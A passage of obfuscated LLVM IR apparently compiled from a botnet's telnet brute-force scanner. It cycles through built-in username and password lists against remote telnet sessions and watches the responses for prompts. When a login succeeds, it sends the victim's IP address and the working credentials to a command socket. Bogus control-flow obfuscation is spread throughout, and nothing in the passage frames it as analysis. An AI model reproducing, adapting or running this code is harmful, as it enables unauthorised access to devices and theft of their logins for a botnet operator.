  %703 = icmp slt i32 %698, 10
  %704 = or i1 %702, %703
  br i1 %704, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %696
  %705 = load i32, i32* %2, align 4
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %706
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %707, i32 0, i32 0
  %709 = load i32, i32* %708, align 16
  %710 = load i32, i32* %2, align 4
  %711 = sext i32 %710 to i64
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %711
  %713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %712, i32 0, i32 4
  %714 = load i8, i8* %713, align 2
  %715 = zext i8 %714 to i64
  %716 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %715
  %717 = load i8*, i8** %716, align 8
  %718 = load i32, i32* %2, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 4
  %722 = load i8, i8* %721, align 2
  %723 = zext i8 %722 to i64
  %724 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %723
  %725 = load i8*, i8** %724, align 8
  %726 = call i64 @strlen(i8* %725) #10
  %727 = call i64 @send(i32 %709, i8* %717, i64 %726, i32 16384)
  %728 = icmp slt i64 %727, 0
  %729 = load i32, i32* @x.63
  %730 = load i32, i32* @y.64
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %728, label %737, label %768

; <label>:737:                                    ; preds = %originalBBpart261
  %738 = load i32, i32* @x.63
  %739 = load i32, i32* @y.64
  %740 = sub i32 %738, 1
  %741 = mul i32 %738, %740
  %742 = urem i32 %741, 2
  %743 = icmp eq i32 %742, 0
  %744 = icmp slt i32 %739, 10
  %745 = or i1 %743, %744
  br i1 %745, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %737
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 0
  %750 = load i32, i32* %749, align 16
  %751 = call i32 @sclose(i32 %750)
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 2
  store i8 0, i8* %755, align 8
  %756 = load i32, i32* %2, align 4
  %757 = sext i32 %756 to i64
  %758 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %757
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %758, i32 0, i32 3
  store i8 1, i8* %759, align 1
  %760 = load i32, i32* @x.63
  %761 = load i32, i32* @y.64
  %762 = sub i32 %760, 1
  %763 = mul i32 %760, %762
  %764 = urem i32 %763, 2
  %765 = icmp eq i32 %764, 0
  %766 = icmp slt i32 %761, 10
  %767 = or i1 %765, %766
  br i1 %767, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %1548

; <label>:768:                                    ; preds = %originalBBpart261
  %769 = load i32, i32* @x.63
  %770 = load i32, i32* @y.64
  %771 = sub i32 %769, 1
  %772 = mul i32 %769, %771
  %773 = urem i32 %772, 2
  %774 = icmp eq i32 %773, 0
  %775 = icmp slt i32 %770, 10
  %776 = or i1 %774, %775
  br i1 %776, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %768
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 0
  %781 = load i32, i32* %780, align 16
  %782 = call i64 @send(i32 %781, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %783 = icmp slt i64 %782, 0
  %784 = load i32, i32* @x.63
  %785 = load i32, i32* @y.64
  %786 = sub i32 %784, 1
  %787 = mul i32 %784, %786
  %788 = urem i32 %787, 2
  %789 = icmp eq i32 %788, 0
  %790 = icmp slt i32 %785, 10
  %791 = or i1 %789, %790
  br i1 %791, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br i1 %783, label %792, label %807

; <label>:792:                                    ; preds = %originalBBpart269
  %793 = load i32, i32* %2, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %794
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %795, i32 0, i32 0
  %797 = load i32, i32* %796, align 16
  %798 = call i32 @sclose(i32 %797)
  %799 = load i32, i32* %2, align 4
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %800
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %801, i32 0, i32 2
  store i8 0, i8* %802, align 8
  %803 = load i32, i32* %2, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 3
  store i8 1, i8* %806, align 1
  br label %1548

; <label>:807:                                    ; preds = %originalBBpart269
  %808 = load i32, i32* %2, align 4
  %809 = sext i32 %808 to i64
  %810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %809
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %810, i32 0, i32 2
  store i8 4, i8* %811, align 8
  br label %1531

; <label>:812:                                    ; preds = %116
  %813 = load i32, i32* %2, align 4
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %814
  %816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %815, i32 0, i32 6
  %817 = load i32, i32* %816, align 4
  %818 = icmp eq i32 %817, 0
  br i1 %818, label %819, label %825

; <label>:819:                                    ; preds = %812
  %820 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %821 = load i32, i32* %2, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 6
  store i32 %820, i32* %824, align 4
  br label %825

; <label>:825:                                    ; preds = %819, %812
  %826 = load i32, i32* @x.63
  %827 = load i32, i32* @y.64
  %828 = sub i32 %826, 1
  %829 = mul i32 %826, %828
  %830 = urem i32 %829, 2
  %831 = icmp eq i32 %830, 0
  %832 = icmp slt i32 %827, 10
  %833 = or i1 %831, %832
  br i1 %833, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %825
  %834 = load i32, i32* %2, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %835
  %837 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %836, i32 0, i32 0
  %838 = load i32, i32* %837, align 16
  %839 = load i32, i32* %2, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 8
  %843 = load i8*, i8** %842, align 8
  %844 = load i32, i32* %2, align 4
  %845 = sext i32 %844 to i64
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %845
  %847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %846, i32 0, i32 7
  %848 = load i16, i16* %847, align 16
  %849 = zext i16 %848 to i32
  %850 = call i32 @readUntil(i32 %838, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %843, i32 1024, i32 %849)
  %851 = icmp ne i32 %850, 0
  %852 = load i32, i32* @x.63
  %853 = load i32, i32* @y.64
  %854 = sub i32 %852, 1
  %855 = mul i32 %852, %854
  %856 = urem i32 %855, 2
  %857 = icmp eq i32 %856, 0
  %858 = icmp slt i32 %853, 10
  %859 = or i1 %857, %858
  br i1 %859, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br i1 %851, label %860, label %950

; <label>:860:                                    ; preds = %originalBBpart273
  %861 = load i32, i32* @mainCommSock, align 4
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 1
  %866 = bitcast i32* %865 to %struct.in_addr*
  %867 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %866, i32 0, i32 0
  %868 = load i32, i32* %867, align 4
  %869 = call i8* @inet_ntoa(i32 %868) #2
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 4
  %874 = load i8, i8* %873, align 2
  %875 = zext i8 %874 to i64
  %876 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %875
  %877 = load i8*, i8** %876, align 8
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 5
  %882 = load i8, i8* %881, align 1
  %883 = zext i8 %882 to i64
  %884 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %883
  %885 = load i8*, i8** %884, align 8
  %886 = call i32 (i32, i8*, ...) @sockprintf(i32 %861, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.77, i32 0, i32 0), i8* %869, i8* %877, i8* %885)
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 6
  store i32 0, i32* %890, align 4
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 7
  store i16 0, i16* %894, align 16
  %895 = load i32, i32* %2, align 4
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %896
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %897, i32 0, i32 8
  %899 = load i8*, i8** %898, align 8
  %900 = call i8* @strstr(i8* %899, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.76, i32 0, i32 0)) #10
  %901 = icmp ne i8* %900, null
  br i1 %901, label %902, label %907

; <label>:902:                                    ; preds = %860
  %903 = load i32, i32* %2, align 4
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %904
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %905, i32 0, i32 2
  store i8 5, i8* %906, align 8
  br label %928

; <label>:907:                                    ; preds = %860
  %908 = load i32, i32* @x.63
  %909 = load i32, i32* @y.64
  %910 = sub i32 %908, 1
  %911 = mul i32 %908, %910
  %912 = urem i32 %911, 2
  %913 = icmp eq i32 %912, 0
  %914 = icmp slt i32 %909, 10
  %915 = or i1 %913, %914
  br i1 %915, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %907
  %916 = load i32, i32* %2, align 4
  %917 = sext i32 %916 to i64
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %917
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %918, i32 0, i32 2
  store i8 7, i8* %919, align 8
  %920 = load i32, i32* @x.63
  %921 = load i32, i32* @y.64
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br label %928

; <label>:928:                                    ; preds = %originalBBpart277, %902
  %929 = load i32, i32* @x.63
  %930 = load i32, i32* @y.64
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %928
  %937 = load i32, i32* %2, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 8
  %941 = load i8*, i8** %940, align 8
  call void @llvm.memset.p0i8.i64(i8* %941, i8 0, i64 1024, i32 1, i1 false)
  %942 = load i32, i32* @x.63
  %943 = load i32, i32* @y.64
  %944 = sub i32 %942, 1
  %945 = mul i32 %942, %944
  %946 = urem i32 %945, 2
  %947 = icmp eq i32 %946, 0
  %948 = icmp slt i32 %943, 10
  %949 = or i1 %947, %948
  br i1 %949, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %1548

; <label>:950:                                    ; preds = %originalBBpart273
  %951 = load i32, i32* @x.63
  %952 = load i32, i32* @y.64
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %950
  %959 = load i32, i32* %2, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 8
  %963 = load i8*, i8** %962, align 8
  %964 = call i8* @strstr(i8* %963, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %965 = icmp ne i8* %964, null
  %966 = load i32, i32* @x.63
  %967 = load i32, i32* @y.64
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %965, label %974, label %989

; <label>:974:                                    ; preds = %originalBBpart285
  %975 = load i32, i32* %2, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 0
  %979 = load i32, i32* %978, align 16
  %980 = call i32 @sclose(i32 %979)
  %981 = load i32, i32* %2, align 4
  %982 = sext i32 %981 to i64
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 2
  store i8 0, i8* %984, align 8
  %985 = load i32, i32* %2, align 4
  %986 = sext i32 %985 to i64
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %986
  %988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %987, i32 0, i32 3
  store i8 0, i8* %988, align 1
  br label %1548

; <label>:989:                                    ; preds = %originalBBpart285
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 8
  %994 = load i8*, i8** %993, align 8
  %995 = call i64 @strlen(i8* %994) #10
  %996 = trunc i64 %995 to i16
  %997 = load i32, i32* %2, align 4
  %998 = sext i32 %997 to i64
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %998
  %1000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %999, i32 0, i32 7
  store i16 %996, i16* %1000, align 16
  br label %1001

; <label>:1001:                                   ; preds = %989
  %1002 = load i32, i32* %2, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 6
  %1006 = load i32, i32* %1005, align 4
  %1007 = add i32 %1006, 8
  %1008 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1009 = icmp ult i32 %1007, %1008
  br i1 %1009, label %1010, label %1041

; <label>:1010:                                   ; preds = %1001
  %1011 = load i32, i32* @x.63
  %1012 = load i32, i32* @y.64
  %1013 = sub i32 %1011, 1
  %1014 = mul i32 %1011, %1013
  %1015 = urem i32 %1014, 2
  %1016 = icmp eq i32 %1015, 0
  %1017 = icmp slt i32 %1012, 10
  %1018 = or i1 %1016, %1017
  br i1 %1018, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %1010
  %1019 = load i32, i32* %2, align 4
  %1020 = sext i32 %1019 to i64
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1020
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1021, i32 0, i32 0
  %1023 = load i32, i32* %1022, align 16
  %1024 = call i32 @sclose(i32 %1023)
  %1025 = load i32, i32* %2, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1026
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1027, i32 0, i32 2
  store i8 0, i8* %1028, align 8
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 3
  store i8 1, i8* %1032, align 1
  %1033 = load i32, i32* @x.63
  %1034 = load i32, i32* @y.64
  %1035 = sub i32 %1033, 1
  %1036 = mul i32 %1033, %1035
  %1037 = urem i32 %1036, 2
  %1038 = icmp eq i32 %1037, 0
  %1039 = icmp slt i32 %1034, 10
  %1040 = or i1 %1038, %1039
  br i1 %1040, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %1041

; <label>:1041:                                   ; preds = %originalBBpart289, %1001
  br label %1531

; <label>:1042:                                   ; preds = %116
  %1043 = load i32, i32* @x.63
  %1044 = load i32, i32* @y.64
  %1045 = sub i32 %1043, 1
  %1046 = mul i32 %1043, %1045
  %1047 = urem i32 %1046, 2
  %1048 = icmp eq i32 %1047, 0
  %1049 = icmp slt i32 %1044, 10
  %1050 = or i1 %1048, %1049
  br i1 %1050, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %1042
  %1051 = load i32, i32* %2, align 4
  %1052 = sext i32 %1051 to i64
  %1053 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1052
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 16
  %1056 = load i32, i32* %2, align 4
  %1057 = sext i32 %1056 to i64
  %1058 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1057
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1058, i32 0, i32 5
  %1060 = load i8, i8* %1059, align 1
  %1061 = zext i8 %1060 to i64
  %1062 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1061
  %1063 = load i8*, i8** %1062, align 8
  %1064 = load i32, i32* %2, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 5
  %1068 = load i8, i8* %1067, align 1
  %1069 = zext i8 %1068 to i64
  %1070 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1069
  %1071 = load i8*, i8** %1070, align 8
  %1072 = call i64 @strlen(i8* %1071) #10
  %1073 = call i64 @send(i32 %1055, i8* %1063, i64 %1072, i32 16384)
  %1074 = icmp slt i64 %1073, 0
  %1075 = load i32, i32* @x.63
  %1076 = load i32, i32* @y.64
  %1077 = sub i32 %1075, 1
  %1078 = mul i32 %1075, %1077
  %1079 = urem i32 %1078, 2
  %1080 = icmp eq i32 %1079, 0
  %1081 = icmp slt i32 %1076, 10
  %1082 = or i1 %1080, %1081
  br i1 %1082, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br i1 %1074, label %1083, label %1114

; <label>:1083:                                   ; preds = %originalBBpart293
  %1084 = load i32, i32* @x.63
  %1085 = load i32, i32* @y.64
  %1086 = sub i32 %1084, 1
  %1087 = mul i32 %1084, %1086
  %1088 = urem i32 %1087, 2
  %1089 = icmp eq i32 %1088, 0
  %1090 = icmp slt i32 %1085, 10
  %1091 = or i1 %1089, %1090
  br i1 %1091, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %1083
  %1092 = load i32, i32* %2, align 4
  %1093 = sext i32 %1092 to i64
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 0
  %1096 = load i32, i32* %1095, align 16
  %1097 = call i32 @sclose(i32 %1096)
  %1098 = load i32, i32* %2, align 4
  %1099 = sext i32 %1098 to i64
  %1100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1099
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1100, i32 0, i32 2
  store i8 0, i8* %1101, align 8
  %1102 = load i32, i32* %2, align 4
  %1103 = sext i32 %1102 to i64
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1103
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1104, i32 0, i32 3
  store i8 1, i8* %1105, align 1
  %1106 = load i32, i32* @x.63
  %1107 = load i32, i32* @y.64
  %1108 = sub i32 %1106, 1
  %1109 = mul i32 %1106, %1108
  %1110 = urem i32 %1109, 2
  %1111 = icmp eq i32 %1110, 0
  %1112 = icmp slt i32 %1107, 10
  %1113 = or i1 %1111, %1112
  br i1 %1113, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %1548

; <label>:1114:                                   ; preds = %originalBBpart293
  %1115 = load i32, i32* @x.63
  %1116 = load i32, i32* @y.64
  %1117 = sub i32 %1115, 1
  %1118 = mul i32 %1115, %1117
  %1119 = urem i32 %1118, 2
  %1120 = icmp eq i32 %1119, 0
  %1121 = icmp slt i32 %1116, 10
  %1122 = or i1 %1120, %1121
  br i1 %1122, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %1114
  %1123 = load i32, i32* %2, align 4
  %1124 = sext i32 %1123 to i64
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1124
  %1126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1125, i32 0, i32 0
  %1127 = load i32, i32* %1126, align 16
  %1128 = call i64 @send(i32 %1127, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %1129 = icmp slt i64 %1128, 0
  %1130 = load i32, i32* @x.63
  %1131 = load i32, i32* @y.64
  %1132 = sub i32 %1130, 1
  %1133 = mul i32 %1130, %1132
  %1134 = urem i32 %1133, 2
  %1135 = icmp eq i32 %1134, 0
  %1136 = icmp slt i32 %1131, 10
  %1137 = or i1 %1135, %1136
  br i1 %1137, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br i1 %1129, label %1138, label %1153

; <label>:1138:                                   ; preds = %originalBBpart2101
  %1139 = load i32, i32* %2, align 4
  %1140 = sext i32 %1139 to i64
  %1141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1140
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1141, i32 0, i32 0
  %1143 = load i32, i32* %1142, align 16
  %1144 = call i32 @sclose(i32 %1143)
  %1145 = load i32, i32* %2, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1146
  %1148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1147, i32 0, i32 2
  store i8 0, i8* %1148, align 8
  %1149 = load i32, i32* %2, align 4
  %1150 = sext i32 %1149 to i64
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 3
  store i8 1, i8* %1152, align 1
  br label %1548

; <label>:1153:                                   ; preds = %originalBBpart2101
  %1154 = load i32, i32* %2, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 2
  store i8 6, i8* %1157, align 8
  br label %1531

; <label>:1158:                                   ; preds = %116
  %1159 = load i32, i32* %2, align 4
  %1160 = sext i32 %1159 to i64
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1160
  %1162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1161, i32 0, i32 6
  %1163 = load i32, i32* %1162, align 4
  %1164 = icmp eq i32 %1163, 0
  br i1 %1164, label %1165, label %1171

; <label>:1165:                                   ; preds = %1158
  %1166 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1167 = load i32, i32* %2, align 4
  %1168 = sext i32 %1167 to i64
  %1169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1168
  %1170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1169, i32 0, i32 6
  store i32 %1166, i32* %1170, align 4
  br label %1171

; <label>:1171:                                   ; preds = %1165, %1158
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 16
  %1177 = load i32, i32* %2, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1178
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1179, i32 0, i32 8
  %1181 = load i8*, i8** %1180, align 8
  %1182 = load i32, i32* %2, align 4
  %1183 = sext i32 %1182 to i64
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 7
  %1186 = load i16, i16* %1185, align 16
  %1187 = zext i16 %1186 to i32
  %1188 = call i32 @readUntil(i32 %1176, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1181, i32 1024, i32 %1187)
  %1189 = icmp ne i32 %1188, 0
  br i1 %1189, label %1190, label %1265

; <label>:1190:                                   ; preds = %1171
  %1191 = load i32, i32* %2, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1192
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1193, i32 0, i32 6
  store i32 0, i32* %1194, align 4
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 7
  store i16 0, i16* %1198, align 16
  %1199 = load i32, i32* %2, align 4
  %1200 = sext i32 %1199 to i64
